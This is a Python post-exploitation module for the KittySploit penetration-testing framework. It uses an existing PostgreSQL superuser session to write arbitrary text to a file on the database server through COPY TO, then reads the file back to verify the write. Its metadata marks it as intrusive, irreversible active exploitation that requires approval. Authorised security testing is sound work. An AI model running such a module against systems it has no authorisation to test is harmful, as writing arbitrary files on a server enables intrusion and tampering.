from kittysploit import *
from lib.protocols.postgresql.postgresql_client import PostgreSQLClient


class Module(Post, PostgreSQLClient):

	__info__ = {
		"name": "PostgreSQL Write Server File",
		"description": "Write a file on the server via COPY TO (requires superuser)",
		"author": "KittySploit Team",
		"session_type": SessionType.POSTGRESQL,
	'agent': {
	    'risk': 'intrusive',
	    'effects': ['active_exploitation'],
	    'expected_requests': 2,
	    'reversible': False,
	    'approval_required': True,
	    'produces': ['risk_signals'],
	},
	}

	file_path = OptString("/tmp/kittysploit.txt", "Absolute path on the PostgreSQL server", True)
	content = OptString("kittysploit", "Text content to write", True)

	def run(self):
		try:
			if not self.is_superuser():
				raise ProcedureError(
					FailureType.NotAccess,
					"COPY TO server path requires a superuser session",
				)

			path = str(self.file_path)
			body = str(self.content or "")

			print_status(f"Writing {len(body)} byte(s) to {path}")
			self.write_server_file(path, body)
			print_success(f"Wrote file: {path}")

			try:
				read_back = self.read_server_file(path, length=len(body) + 64)
				if read_back:
					preview = read_back.decode("utf-8", errors="replace")
					print_info(f"Verification read: {preview[:200]}")
			except Exception:
				pass

			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(
				FailureType.Unknown, f"Error writing file: {exc}"
			)
